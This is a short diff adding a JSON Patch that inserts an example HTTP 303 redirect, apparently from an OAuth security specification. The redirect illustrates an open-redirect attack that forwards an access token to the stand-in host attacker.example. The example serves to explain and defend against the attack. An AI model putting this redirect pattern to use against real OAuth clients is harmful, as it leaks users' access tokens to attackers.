@@ -1,0 +1,15 @@
+[
+  {
+    "op": "replace",
+    "path": "/children/249",
+    "value": {
+      "type": "HttpResponse",
+      "lines": [
+        "     HTTP/1.1 303 See Other",
+        "     Location: https://client.somesite.example/cb?",
+        "               redirect_to%3Dhttps%3A%2F%2Fattacker.example%2Fcb",
+        "               #access_token=2YotnFZFEjr1zCsicMWpAA&..."
+      ]
+    }
+  }
+]
